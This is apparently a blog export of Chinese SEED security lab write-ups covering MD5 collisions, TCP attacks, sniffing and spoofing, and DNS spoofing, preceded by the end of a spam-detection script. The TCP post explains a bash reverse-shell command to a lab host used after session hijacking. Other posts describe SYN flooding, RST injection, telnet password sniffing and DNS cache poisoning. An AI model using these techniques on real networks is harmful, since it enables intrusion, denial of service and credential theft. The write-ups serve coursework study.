&#39;wb&#39;) as f:            pickle.dump(vectorizer, f)        print(&quot;保存成功！&quot;)        return True    else:        return False# model_save(model, vectorizer)if __name__ == &quot;__main__&quot;:    print(&quot;-------垃圾邮件检测-------&quot;)    while True:        with open(&quot;model.pkl&quot;, &#39;rb&#39;) as f:            model = pickle.load(f)        with open(&#39;vectorizer.pkl&#39;, &#39;rb&#39;) as f:            vectorizer = pickle.load(f)        file_path = input(&quot;输入需要检测的邮件文件的路径:&quot;)        with open(file_path, &quot;r&quot;, encoding=&quot;gbk&quot;, errors=&quot;ignore&quot;) as f:            email = f.read()        email_list = [email]        print(email)        x = vectorizer.transform(email_list)        y_predict = model.predict(x)        print(&quot;检测结果为：&quot;, y_predict[0])</code></pre>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> 人工智能 </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> Python </tag>
            
            <tag> sklearn </tag>
            
            <tag> spam </tag>
            
            <tag> jieba </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEED：MD5 Collision Attack Lab</title>
      <link href="/posts/seed_md5/"/>
      <url>/posts/seed_md5/</url>
      
        <content type="html"><![CDATA[<p><em>你可以到SEED官网获取实验资料：<a href="https://seedsecuritylabs.org/Labs_20.04/Crypto/Crypto_MD5_Collision/">MD5 Collision Attack Lab</a></em></p><h1 id="MD5碰撞概述"><a href="#MD5碰撞概述" class="headerlink" title="MD5碰撞概述"></a>MD5碰撞概述</h1><h3 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h3><p><a href="https://www.bilibili.com/video/BV1SZ4y1z7wT/">哈希究竟代表什么？哈希表和哈希函数的核心原理</a></p><p>归纳起来，哈希函数应该有以下几个特点：</p><ul><li>单向</li><li>压缩</li><li>弱抗碰撞性：给出一个输入，无法找到一个不同的输入使得它们输出相同。</li><li>强抗碰撞性：无法找到两个不同的输入有相同的输出。</li></ul><h3 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h3><p>由于哈希函数压缩的特性，因此必然产生碰撞。但是一个好的哈希函数应该让寻找碰撞的计算代价尽可能的大，让它在计算上满足抗碰撞性。</p><p>然而，MD5不是这样一个合格的哈希函数。对于MD5哈希函数，使用特定程序能够轻易的找出两个不同输入。</p><h3 id="哈希函数-安全"><a href="#哈希函数-安全" class="headerlink" title="哈希函数 &amp;&amp; 安全"></a>哈希函数 &amp;&amp; 安全</h3><p>哈希函数广泛用于数据完整性校验。</p><p>在网络中，在一条消息后面附上其哈希输出，那么接收消息后检查消息的哈希输出是否一致就可以判断消息是否被更改。</p><p>在计算机系统中，可以为文件附上哈希，那么当这个文件被恶意篡改就能够及时发现。</p><p>另外，由于单向的特性，哈希函数也能用于信息保密。</p><p>在账号口令系统中，通常使用哈希加盐的方式存储口令，这样可以避免泄露用户的真实口令。</p><h1 id="一、作业题目"><a href="#一、作业题目" class="headerlink" title="一、作业题目"></a>一、作业题目</h1><p>本次实验主要是加深大家对MD5碰撞及其原理的理解，使用SEED实验环境中的工具及编程语言，完成以下任务：</p><p><em><strong>1.使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况；</strong></em></p><p><em><strong>2.参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。</strong></em></p><p><em><strong>3.参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。</strong></em></p><p><em><strong>4.回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</strong></em></p><h1 id="二、实验步骤及结果"><a href="#二、实验步骤及结果" class="headerlink" title="二、实验步骤及结果"></a>二、实验步骤及结果</h1><h2 id="1-md5collgen生成碰撞文件"><a href="#1-md5collgen生成碰撞文件" class="headerlink" title="1.md5collgen生成碰撞文件"></a>1.md5collgen生成碰撞文件</h2><h3 id="新建前缀文件prefix-txt"><a href="#新建前缀文件prefix-txt" class="headerlink" title="新建前缀文件prefix.txt"></a>新建前缀文件prefix.txt</h3><p> <img src="/img/cipher_md5/image.png" alt="Alt text"><br>###用md5collgen生成碰撞文件out1.bin和out2.bin<br>.&#x2F;md5collgen -p prefix.txt -o out1.bin out2.bin<br> <img src="/img/cipher_md5/image-1.png" alt="Alt text"><br>###使用bless比较两个文件内容<br>两个文件小部分内容不同。<br> <img src="/img/cipher_md5/image-2.png" alt="Alt text"><br> <img src="/img/cipher_md5/image-3.png" alt="Alt text"><br>###比价两个文件md5值<br>md5sum xxx检查文件md5值，发现这两个不同内容的文件有相同的md5值。（md5算法将文件压缩到128位）<br> <img src="/img/cipher_md5/image-4.png" alt="Alt text"><br>###分析<br>首先，out1.bin和out2.bin文件前面部分都是prefix.txt文件内容，但进行了补全，补全的部分是前64字节。</p><p>其次，out1,bin和out2.bin文件后半部分都是128字节，且这部分包含了这两个文件的差异，并且两个文件的差异比较小。</p><h2 id="2-Lab3-task2-c文件碰撞"><a href="#2-Lab3-task2-c文件碰撞" class="headerlink" title="2.Lab3_task2.c文件碰撞"></a>2.Lab3_task2.c文件碰撞</h2><h3 id="新建文件task2-c"><a href="#新建文件task2-c" class="headerlink" title="新建文件task2.c"></a>新建文件task2.c</h3><p> <img src="/img/cipher_md5/image-5.png" alt="Alt text"><br> <img src="/img/cipher_md5/image-6.png" alt="Alt text"><br>###编译文件<br>gcc task.c -o task<br>###寻找替换程序字符串部分<br>因为md5collgen的prefix部分需要是64字节的倍数，否则补全可能会造成task程序无法运行。因此在task程序找到字符串部分中64字节倍数作为前缀。<br> <img src="/img/cipher_md5/image-7.png" alt="Alt text"><br>（0x3040 &#x3D;&gt; 12352；12352&#x2F;64 &#x3D; 193）<br>###剪切出前缀文件，并生成替换文件<br>从12352字节开始剪切，注意的是生成文件会额外占据128字节，因此要将中间的128字节去掉。<br> <img src="/img/cipher_md5/image-8.png" alt="Alt text"><br>生成替换文件task_out1.bin和task_out2.bin文件<br> <img src="/img/cipher_md5/image-9.png" alt="Alt text"><br>###拼接生成的文件和后缀，并执行这两个文件。<br>可以发现这两个文件输出是不一样的，原因就是md5collgen生成的两个文件128字节不同导致输出字符发生改变。<br> <img src="/img/cipher_md5/image-10.png" alt="Alt text"><br>###分析<br>查看两个文件md5值，发现一样，但是输出不一样（也就是程序中的字符串不一样）。原理就是md5collgen生成的文件改变了字符串，但是没有让md5值发生改变。<br> <img src="/img/cipher_md5/image-11.png" alt="Alt text"></p><h2 id="3-Lab3-task3-c文件碰撞"><a href="#3-Lab3-task3-c文件碰撞" class="headerlink" title="3.Lab3_task3.c文件碰撞"></a>3.Lab3_task3.c文件碰撞</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目分析：代码判断两个变量是否相等导致不同的输出路径；构造两个程序相同md5值有不同输出路径。</p><p>思路：源程序A构造两个相同变量x，y；程序B利用md5构造两个相同变量，输出路径为：&#x3D;&#x3D;；程序C利用md5collgen构造两个不同变量保持和程序A相同的md5值，输出路径为：!&#x3D;，<br>###编写程序task3_a.c<br>上面未显示的部分定义了两个相同的字符串x和y，都是200个0x41（“A”）。<br> <img src="/img/cipher_md5/image-12.png" alt="Alt text"><br>###这里task3_a程序与之前程序类似，我们定位到字符串内容依旧可以选取0x3040进行截取（对应下一个字符串0x3120）。截取的程序头部为task3_pre。<br> <img src="/img/cipher_md5/image-13.png" alt="Alt text"></p><p>利用截取的头部tsak3_pre生成程序头task3_b，task3_c<br> <img src="/img/cipher_md5/image-14.png" alt="Alt text"><br>###拼接字符串x得到程序task3_b，task3_c<br> <img src="/img/cipher_md5/image-15.png" alt="Alt text"><br>###在bless调整字符串y得到task3_b，task3_c<br>Task3_b的x，y字符串相同<br> <img src="/img/cipher_md5/image-16.png" alt="Alt text"><br> <img src="/img/cipher_md5/image-17.png" alt="Alt text"><br>task3_c的x，y字符串不同，y字符串来自task3_b<br> <img src="/img/cipher_md5/image-18.png" alt="Alt text"><br>###运行两个文件<br>检查两个程序md5值<br> <img src="/img/cipher_md5/image-19.png" alt="Alt text"></p><p>可以发现这两个程序走向了两个不同的方向。因为程序B字符串x，y都是md5collgen生成的同一个，然而程序C的x，y字符串则是md5collgen生成的两个不同的。但是它们的md5值相等。<br> <img src="/img/cipher_md5/image-20.png" alt="Alt text"></p><h2 id="4-相同md5值，不同行为的程序？"><a href="#4-相同md5值，不同行为的程序？" class="headerlink" title="4.相同md5值，不同行为的程序？"></a>4.相同md5值，不同行为的程序？</h2><p>从本质上来说，md5值是有限的（2的128次方个），然而程序是无穷的，因此两个不同行为程序完全可能有相同的md5值，碰撞不可避免。</p><p>就这道题分析：使用md5collgen可以生成两个相同md5值但是不同的文件。利用这个特性去替换程序中的字符串，使得一个程序是同一个md5collgen生成值替换，所以两个字符串一样，判断为same；另一个程序使用不同md5collgen生成值，两个字符串不一致，判断为diff，然而同为一个前缀生成，两个md5collgen生成值md5相等，两个程序的md5值也相等。</p>]]></content>
      
      
      <categories>
          
          <category> SEED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEED </tag>
            
            <tag> MD5 Collision Attack Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEED：TCP</title>
      <link href="/posts/seed_tcp/"/>
      <url>/posts/seed_tcp/</url>
      
        <content type="html"><![CDATA[<p>一、作业题目<br>TCP攻击实验<br>二、实验步骤及结果<br>1.实验环境<br>拓扑结构：</p><p>关于容器启动：<br>使用命令dcbuild构建镜像。<br>使用命令dcup，dcdown控制容器启动与关闭。<br>使用命令dockps查看容器id，使用命令dcsh <id>转到容器。<br>关于容器启动：<br>共享文件夹：攻击机与主机共享文件夹volumes。<br>主机模式：攻击机使用主机模式可以访问虚拟机的所有网络接口。<br>Seed账户：<br>在所有容器中都创建了一个名为seed的账户，它的密码是dees。它可以被远程登录。<br>SYN洪泛攻击概述：<br>SYN泛洪攻击是DOS的一种形式，攻击者向受害者的TCP端口发送大量伪造源IP的SYN请求，但是不完成整个连接，这样受害者存储半连接的队列被充满，无法接收正常用户的连接。</p><p>队列的大小被操作系统设置，一般来说计算机内存越大，这个值也就越大。在Ubuntu系统中可以使用下面命令编辑队列大小：</p><p>同时可以使用“netstat -nat”查看队列的使用情况，状态为“SYN-RECV”为半连接，完成3次握手状态为“ESTABLISHED”。<br>SYN Cookie策略：<br>默认情况下，这种策略在Ubuntu中被默认开启，你可以通过下面命令查看：</p><p>这里已经在容器设置的时候被关闭：</p><p>为了能够使用sysctl更改容器内的系统变量，容器需要配置“privileged:true”条目否则可能会受到“只读的文件”。<br>2.使用Python发起攻击<br>完善已有的synflood.py，包括生成随机源IP地址，随机端口号和序列号（Seq）。这里使用getrandbits模块生成随机值即可：</p><p>进入攻击者容器运行程序：</p><p>可以看到运行程序之后，受害者出现很多随机IP&#x2F;端口的TCP半连接：</p><p>这个时候使用telnet访问受害者，发现无法连接上受害者，说明SYN洪泛攻击生效：</p><p>如果你遇到问题，参考以下条目：<br>TCP缓存问题：<br>如果你之前使用telnet连接受害者机器，那么在受害者可能将你计入队列缓存中，Ubuntu将会使用队列的1&#x2F;4的队列作为保存过去已经建立的连接，你可以通过下面命令对缓存进行查看&#x2F;删除：</p><p>TCP重传问题：<br>如果受害者机器接收到SYN请求，那么它会回复一个ACK回应，如果超时没有接收到SYN+ACK请求，那么会重传一定次数的ACK回应。你可以想象如果这个数字过小，那么半连接的队列将会很快被清空，使得洪泛攻击失效。这个数字一般取决于内核参数，一般来说是5：</p><p>TCP队列大小：<br>如果TCP队列过大，而泛洪的速度过小，那么攻击将无法填满半连接队列，泛洪攻击无法生效。<br>你可以通过下面命令查看：</p><ol start="3"><li>   使用C发起攻击<br>相比于Python，C能够更快的发送数据包，因为C具有更快的编译和运行速度，另外能够访问更加底层的协议栈。<br>编译运行共享文件夹中的synflood.c文件，对受害者机器发起泛洪攻击：</li></ol><p>可以看到队列迅速被占据：</p><p>使用telnet连接受害者机器，无法连接：</p><ol start="4"><li>   启用SYN Cookie对策<br>对于不启用SYN Cookie策略的机器，TCP连接信息的保存像Web应用中的Session一样，由服务器保存连接信息，当连接量过大时严重占用内存。而启用SYN cookie以后像Web应用中的token技术，服务端发送token给客户端，连接信息的保管从服务器下发到各个终端。</li></ol><p>可以使用下面命令开启这个策略：</p><p>开启之后我们再次运行程序，可以看到：</p><p>这里依然具有半连接队列，但是不同的是如果半连接队列没有空闲位置，服务端将不会在半连接队列中记录该连接请求，而是根据该连接请求的信息计算出一个特殊的 SYN+ACK 响应包，这样就能确保半连接队列满了以后仍然能够建立连接：</p><p>Telnet连接上的RST攻击<br>TCP的RST报文能够立即终止用户间的TCP连接，如果能够代替用户发送RST报文，那么就能够实现恶意断开正常TCP连接的攻击。<br>现在需要用手动和自动两种方式完善下面代码:</p><ol start="5"><li>   自动发起攻击<br>分别进入容器user1和user2，使用容器user1对user2发起telnet连接（同时打开Warshark）：</li></ol><p>编写一个嗅探代码，在回调函数中发送RST报文：</p><p>运行程序，发现telnet连接已经被断开：</p><p>程序发送了三个RST报文，因为它每次捕获到目标地址为受害者机器（10.9.0.5）时发送RST报文：</p><p>可以在warshark中看看发生了什么，可以看到当10.9.0.6向受害者使用telnet协议发送数据触发程序发送RST报文，同时对方发送RST并断开连接：</p><p>TCP会话劫持：<br>攻击者通过像会话中注入恶意内容来劫持会话。如果当一个telnet会话被劫持以后，攻击者通常不满足于运行一些恶意命令比如删除文件，而是直接建立一个后门。<br>6.自动实现TCP会话劫持<br>编写一个嗅探程序，当捕获到指定报文后，调用回调函数伪造一个恶意报文（生成一个txt文件）同样进行发送：（这里受害者是user1容器10.9.0.6）</p><p>在攻击者容器运行这个程序：</p><p>使用受害者容器telnet容器user1，发现容器victim已经无法进行操作：</p><p>进入容器user1发现已经成功通过会话劫持创建了文件并写入内容：</p><ol start="7"><li>   使用TCP会话劫持创建一个反弹shell<br>编写反弹shell代码。&#x2F;bin&#x2F;bash：指定要执行的Shell程序是Bash。<br>-i：告诉Bash要以交互模式启动，这样它就可以与用户进行命令行交互。<br>&#x2F;dev&#x2F;tcp&#x2F;10.9.0.1&#x2F;9090：将Bash shell的输出重定向到TCP流中，并将该流发送到IP地址为10.9.0.1，端口号为8888的目标主机上。<br>0&lt;&amp;1：将标准输入（stdin）重定向到标准输出（stdout），这样所有输入和输出都将通过TCP流发送到攻击者主机上。<br>2&gt;&amp;1：将标准错误（stderr）重定向到标准输出（stdout），这样所有错误信息也会发送到攻击者主机上。</li></ol><p>使用容器user1用telnet连接容器victim：</p><p>运行TCP劫持程序，对9090进行监听成功得到shell：</p>]]></content>
      
      
      <categories>
          
          <category> SEED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> SEED </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEED：Sniff and Spoof</title>
      <link href="/posts/seed_sniffspoof/"/>
      <url>/posts/seed_sniffspoof/</url>
      
        <content type="html"><![CDATA[<p>课程实践报告</p><p>课程         网络攻防技术(314006040)<br>课 序 号                   3<br>作业名称         网络流量嗅探和窃取实验<br>评分<br>姓名       杨森        学号   2021141530084<br>评阅意见                                          </p><p> <br>一、作业题目<br>嗅探和欺骗<br>二、实验步骤及结果<br>1.实验环境设置<br>1)拓扑结构</p><p>网路接口bridge，host，none都是docker自己创建的。三个容器使用我们自定义的网络接口：636082fa98c9，这个网络接口相当于三个容器的交换机：</p><ol start="2"><li>   容器使用<br>首先进入Labsetup文件夹，使用命令dcbuild和dcup编译和启动容器。如果需要关闭：dcdown。</li></ol><p>你可以通过以下命令（dockps）查看容器id：</p><p>如果需要使用某个容器的终端，需要执行命令：docksh <id>，或者这样也行：（键入exit退出）</p><ol start="3"><li>   关于攻击机<br>共享文件夹&#x2F;volumes：虚拟机和attacker容器之间的共享文件夹，为了方便在docker容器中使用虚拟机的编辑器编写的代码。</li></ol><p>主机模式：对于桥接模式下的三个容器，他们并不能互相访问各自的网络接口，因为他们被桥接模式虚拟成局域网下的不同主机。将容器attacker修改为主机模式，那么他将可以访问虚拟机的所有网卡。</p><p>补充：<br>对于使用主机模式的容器，docker不会为其虚拟网络接口，而是直接使用宿主机的网络接口。我这里做了一个简单的实验，进入容器attacker对1.2.3.4发起ping：</p><p>这里并没有看到容器接口veth流量进行波动，说明docker并没有为主机模式的容器虚拟出网卡。<br>另外，使用虚拟机对容器attacker发起ping：</p><p>这里回环网卡波动，这就说明容器attacker是主机模式，并且使用虚拟机网卡。<br>第一部分：使用scapy嗅探和欺骗<br>2.嗅探数据包<br>使用scapy嗅探数据包是一件简单的事情，这里将网卡设置为三个容器的桥接网络：</p><ol><li>   使用root权限对sniff的影响</li></ol><p>使用root权限：<br>sniff函数对于每一个捕获的数据包都会调用回调函数print_pkt打印出数据包相关信息：</p><p>打开一个终端使用命令：ping 10.9.0.5，这里我使用-i参数将时间间隔设置为一秒：</p><p>另一个终端以root权限运行python程序进行监听：</p><p>上面有两个数据包，第一个ICMP报文类型为“request”，源IP为10.9.0.1，目的IP为10.9.0.5；第二个ICMP报文类型为“reply”，源IP为10.9.0.5，目的IP为10.9.0.1。结合在ping命令终端看到的情景，这里sniff程序嗅探数据包成功。</p><p>不使用root权限运行：</p><p>python程序中打印“sniff…”语句成功执行，执行sniff函数权限不够导致报错。这是因为sniff函数会首先默认以混杂模式打开一个网络接口，因此需要root权限。<br>2)采用不同的过滤方式嗅探数据包<br>只捕获ICMP协议报文：<br>在上面“使用root权限对sniff的影响”中已经完成此实验，上面的代码就是过滤的icmp协议：</p><p>Icmp报文：</p><p>捕获指定IP的23端口的TCP报文：</p><p>在Linux和Windows操作系统下，23端口都用于远程连接服务Telnet。可以使用telnet命令发送连接的TCP数据包。</p><p>Sniff程序成功嗅探到telnet的数据包：</p><p>捕获发往特定子网的数据包：</p><p>ping一下这个子网就行，如果捕获到数据包证明程序正常：</p><ol start="3"><li>   伪造ICMP数据包<br>修改源IP为hostA（10.9.0.5），向hostB（10.9.0.6）发送ICMP请求报文：</li></ol><p>运行spoof程序，监听桥接网络，发现伪造的ICMP请求报文和接收到ICMP回应报文：</p><p>在伪造源IP的ICMP报文中可以看到，attacker的mac地址如下。</p><p>然而ICMP回应报文的mac地址却是hostA的：</p><p>这说明更改ICMP报文的源IP地址，会让对方相信这个错误的IP地址。<br>4.Traceroute程序<br>Tracert依靠于ICMP协议，通过将ttl从1不断加大到能达到目的IP从而了解数据包的网络经过：</p><p>运行程序：</p><p>Warshark查看详细信息：</p><ol start="5"><li>   嗅探然后欺骗<br>如果嗅探到ping包，则伪造ip返回一个ping响应包，那么只需要在回调函数中伪造源IP的ping回应包即可，这里将嗅探到返回的数据包附加上负载“spoof”便于区分：</li></ol><p>Ping 1.2.3.4，一个不存在于网络的主机：<br>进入容器attacker对1.2.3.4发起ping，运行编写的程序：</p><p>Warshark抓包，在ICMP回应报文出现负载“spoof”，程序成功发送欺骗的数据包：</p><p>Ping 10.9.0.99，一个不存在的局域网主机：<br>进入容器attacker对10.9.0.99发起ping，运行编写的程序：</p><p>打开warshark，发现编写的程序成功并没有成功返回欺骗报文，因为在arp解析失败以后icmp包根本就没有发出，而是系统认为目标不可达：</p><p>Ping 8.8.8.8，一个存在于网络的主机：<br>进入容器attacker对8.8.8.8发起ping，运行编写的程序：</p><p>在容器attacker中ping8.8.8.8实际上就是虚拟机对8.8.8.8进行ping，因此warshark中桥接网络并没有attcker发的包。由于操作系统将伪造的响应包算作回环网络里面，因此回环网络有流量波动，打开any网络接口（包括回环）查看伪造的响应包，发现负载“spoof”的响应包：</p><p>在hostA（10.9.0.5）运行程序对8.8.8.8发起的ping，运行编写的程序：</p><p>在warshark中查看，可以发现同一个ICMP请求收到了两个回复，带有负载“spoof”的回复是程序sniff_spoof.py响应的：</p><p>另外当hostA对8.8.8.8进行ping，发现宿主机也在ping？</p><p>第二部分：编写嗅探和伪造数据包的程序<br>6.编写数据包嗅探程序<br>在这个任务中，需要在虚拟机与容器attacker的共享文件夹volumes中编辑C代码。docker-cp a.out &lt;容器id&gt;:&#x2F;tmp<br>1)了解一个嗅探器如何工作<br>嗅探器实际是通过网络接口<br>对于链路层帧结构：同步码（8字节），目的MAC地址（6字节），源MAC地址（6字节），类型（2字节），数据部分，CRC校验码（4字节）。当以太网帧中的类型字段的值为0x0800时，表示数据部分采用的是IPv4协议；当类型字段的值为0x86DD时，表示数据部分采用的是IPv6协议。<br>对于网络层包结构：</p><p>根据提供的代码编写一个能够打印捕获数据包的源&#x2F;目的IP地址的程序：</p><p>问题一：描述库调用的顺序。<br>首先调用pcap_open_live函数打开网络接口；然后使用pcap_compile函数编译BPF过滤表达式；最后使用pcap_loop函数循环捕获数据包并调用回调函数，pcap_close进行关闭网卡。</p><p>问题二：为什么需要root权限运行嗅探器程序，是哪个地方需要root权限。<br>在程序中调用pcap_open_live函数来打开网络接口进行数据包捕获时，需要root权限。在调用pcap_compile和pcap_setfilter函数来编译和设置数据包过滤规则时，同样需要root权限。</p><p>问题三：演示打开和关闭混杂模式的区别。<br>开启混杂模式，使用hostA对hostB发起ping：</p><p>在attacker中运行sniff程序，可以发现即使源&#x2F;目标地址并不是自己，但是仍然捕获了这些数据包：</p><p>关闭混杂模式，同样使用hostA对hostB发起ping，程序已经不能捕获hostA和hostB之间的通信：</p><p>由此可知，混杂模式可以捕获经过网卡的其他数据包。</p><ol start="2"><li>   编写过滤器<br>捕获两个特定主机的ICMP数据包：<br>根据BPF过滤规则编写即可。</li></ol><p>在hostA中对hostB发起ping，执行编写的程序：</p><p>可以看到嗅探到了icmp数据包，并且打印出了源&#x2F;目标IP：</p><p>捕获端口10-100的TCP数据包：</p><p>使用telnet服务对hostB发起请求，并执行编写的程序：</p><p>可以看到成功捕获到指定的数据包：</p><p>然而使用nc工具对attacker发起请求，执行编写的程序进行嗅探：</p><p>可以看到没有捕获到任何内容，但是nc工具却捕获到了101端口tcp数据包：</p><ol start="4"><li>   嗅探密码<br>由于telnet服务使用明文传输数据包，因此使用嗅探器可以窃取telnet协议发送的数据包当中的密码。<br>这里根据tcp协议字段判断telnet报文，然后根据找出telnet数据的指针位置，计算数据长度，最后打印出数据部分：</li></ol><p>运行程序，成功捕获到telnet数据部分，可以看到“pas…”部分就是我输入的密码字段：</p><ol start="7"><li>   欺骗<br>对于一般用户，操作系统限制对TCP&#x2F;IP一些字段的控制。但是，如果拥有root权限，就可以控制TCP&#x2F;IP的所有字段。</li></ol><p>原始套接字提供了程序员对数据包的绝对控制，使用原始套接字非常简单；它包括四个步骤：（1）创建一个原始套接字，（2）设置套接字选项，（3）构造数据包，（4）通过原始套接字发送数据包。<br>1)编写一个欺骗程序<br>伪造数据包，需要创建原始套接字，它允许对数据包有足够的控制。其次，需要定义网络层，运输层的结构体，方便构造数据包，这里引用netinet库实现这个功能：</p><p>可以看到warshark成功捕获到伪造的数据包，这说明欺骗程序生效：</p><ol start="2"><li>   伪造ICMP请求数据包<br>相比上面的程序，这里需要构造icmp协议的结构体：</li></ol><p>运行编写的程序：</p><p>在warshark中成功捕获到程序发送的数据包：</p><p>问题四：可以将IP数据包长度字段设置为任意值，而不管实际数据包有多大吗？</p><p>在构造IP数据包时，IP数据包长度字段是指整个IP数据包的长度，包括IP头部和数据部分。这个字段的取值应当是整个IP数据包的实际长度，而不是任意值。</p><p>如果发送的数据包长度超过了MTU（最大传输单元），那么数据包将被分片成多个较小的数据包。在这种情况下，每个分片的IP数据包长度字段会被设置为对应分片的长度，而不是整个数据包的长度。</p><p>问题五：使用原始套接字编程，是否必须计算IP标头的校验和？</p><p>在使用原始套接字（raw socket）发送自定义的IP数据包时，如果设置了IP_HDRINCL选项，就不需要手动计算IP头部的校验和。当IP_HDRINCL选项被启用时，内核会自动计算IP头部的校验和，并填充正确的数值。<br>否则，需要使用程序计算校验和，确保目标主机不会舍弃这个数据报。</p><p>问题六：为什么需要root权限才能运行使用原始套接字的程序？如果在没有root权限的情况下执行程序，程序会在哪里失败？</p><p>使用原始套接字可以直接访问链路层和网络层，发送自定义的数据包，这可能会对网络造成安全风险，因此需要特权才能执行。</p><p>如果在没有root权限的情况下执行使用原始套接字的程序，程序在以下步骤会失败：调用socket函数时会返回错误，因为创建原始套接字需要特权。如果尝试设置IP_HDRINCL选项也会失败，因为设置该选项同样需要特权。</p><p>因此，如果没有root权限，程序将无法成功创建原始套接字或者设置IP_HDRINCL选项，从而无法发送自定义的IP数据包。<br>8.嗅探，发送欺骗数据报<br>将上面编写的嗅探程序做修改，过滤icmp请求报文；修改回调函数，通过传入的数据包获取源&#x2F;目标IP地址，修改伪造程序为构造icmp响应报文，并修改填入的源&#x2F;目标ip即可：</p><p>对1.2.3.4发起ping，运行程序：</p><p>在warshark中可以看到捕获到程序发送的响应报文：</p>]]></content>
      
      
      <categories>
          
          <category> SEED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> SEED </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEED：DNS</title>
      <link href="/posts/seed_dns/"/>
      <url>/posts/seed_dns/</url>
      
        <content type="html"><![CDATA[<h1 id="一-DNS概述"><a href="#一-DNS概述" class="headerlink" title="一 DNS概述"></a>一 DNS概述</h1><h3 id="为什么需要DNS？"><a href="#为什么需要DNS？" class="headerlink" title="为什么需要DNS？"></a>为什么需要DNS？</h3><p>网络中的计算机使用IP地址进行标识，如果你想连接一台网络中的计算机，你必须知道它的IP地址。</p><p>然而记住一串点分二进制的表示是困难的，因为它们没有什么实际意义，因此在公开的网络中，服务器使用对外公开的域名进行标识。</p><p>DNS：Domain Name System域名系统将域名转换为IP地址。</p><h3 id="DNS如何构建？"><a href="#DNS如何构建？" class="headerlink" title="DNS如何构建？"></a>DNS如何构建？</h3><p>DNS被设计成树状结构，就像这样：</p><ul><li>Root根服务器：</li><li>TLS顶级域名服务器：</li><li>NS权威域名服务器：</li></ul><p>另外还有本地DNS服务器，这个DNS服务器帮助主机对DNS进行查询，包括迭代查询和递归查询：</p><h3 id="DNS如何使用？"><a href="#DNS如何使用？" class="headerlink" title="DNS如何使用？"></a>DNS如何使用？</h3><p>进行DNS查询非常简单，因为本地DNS服务器会帮助主机完成这个工作。</p><p>因此，本地DNS服务器可以收集用户访问网站的信息。</p><h3 id="DNS缓存和Hosts文件"><a href="#DNS缓存和Hosts文件" class="headerlink" title="DNS缓存和Hosts文件"></a>DNS缓存和Hosts文件</h3><h3 id="DNS的安全问题"><a href="#DNS的安全问题" class="headerlink" title="DNS的安全问题"></a>DNS的安全问题</h3><p>DNS被要求一个快的速度，DNS解析的速度越快，那么浏览器访问网页的速度也就越快，因此DNS使用明文。这样DNS就会出现问题：受到恶意的DNS回复。现在的DNS系统使用DNS缓存和随机化的DNS端口和序列号。<br>DNS本地攻击实验&amp;&amp;DNS远程攻击实验<br>二、实验步骤及结果<br>DNS本地攻击实验<br>1.实验环境<br>1)拓扑结构：</p><ol start="2"><li><p>   关于攻击机（10.9.0.1）：<br>共享文件夹和主机模式。</p></li><li><p>   关于本地DNS服务器（10.9.0.53）：<br>本地DNS服务器上运行Bind 9 DNS server程序，Bin9从.&#x2F;etc&#x2F;bind&#x2F;named.conf中获取配置信息。named.conf文件一般使用include包含其他配置文件named.conf文件。包括named.conf.options文件，用于定义dns工作方式；named.conf.local文件用于本地域管理，named.conf.default-zones定义了一些默认的域名解析区域：</p></li></ol><p>本地dns服务器已经关闭随机源端口号（固定的源端口为“33333”），关闭DNSSEC，这可以让实验更加简单。另外，如果需要清除本地DNS缓存和保存DNS缓存可以使用下面命令：</p><ol start="2"><li>   测试DNS设置<br>下面是攻击者的域名服务器的DNS记录，可以看到这个服务器管理attacker32.com域同时伪造了example.com域的信息：</li></ol><ol><li><p>   获取ns.attacker32.com的IP地址<br>查询结果为：10.9.0.153，DNS查询到攻击者DNS服务器中的域信息。</p></li><li><p>   获取<a href="http://www.example.com的ip地址/">www.example.com的IP地址</a><br>dig <a href="http://www.example.com/">www.example.com</a>:<br>查询结果为：93.184.216.34。在本地DNS服务器中，查询example.com域名会被指向正确的权威服务器而不会受到攻击者的DNS服务器影响。</p></li></ol><p>dig @ns.attacker32.com <a href="http://www.example.com/">www.example.com</a>:<br>查询结果为：1.2.3.5。如果对权威服务器指定为攻击者的DNS服务器，那么将会查询到上面写入的恶意域信息。</p><ol start="3"><li>   直接欺骗对用户的响应<br>当用户在Web浏览器中输入域名回车后，用户计算机发起对本地域名服务器的DNS请求，以获取目标主机的IP地址。攻击者可以嗅探DNS请求，并伪造恶意的DNS回复误导用户连接恶意的主机。</li></ol><p>现在编写程序实现上面的功能，使用scapy伪造本地DNS服务器的DNS回复即可（下面程序同时实现更改A记录和NS记录）：</p><p>运行程序，发现A记录已经将<a href="http://www.example.com的ip地址映射为10.9.0.5了.同时用户查询也为错误ip./">www.example.com的IP地址映射为10.9.0.5了。同时用户查询也为错误IP。</a></p><ol start="4"><li>   DNS缓存投毒攻击-伪造DNS回复<br>使用DNS回复欺骗用户并不是一种持久的方案，因为对于用户的每次请求，都需要伪造DNS回复。更好的方案是向本地DNS投毒，这样在缓存记录生效的时间内，都能对使用该本地域名服务器的用户造成攻击。</li></ol><p>下面编写代码实现这个功能：<br>与上面代码相同。<br>运行程序，看到已经发送NS记录了：</p><p>将本地DNS缓存保存到文件，发现已经被缓存投毒：</p><ol start="5"><li>   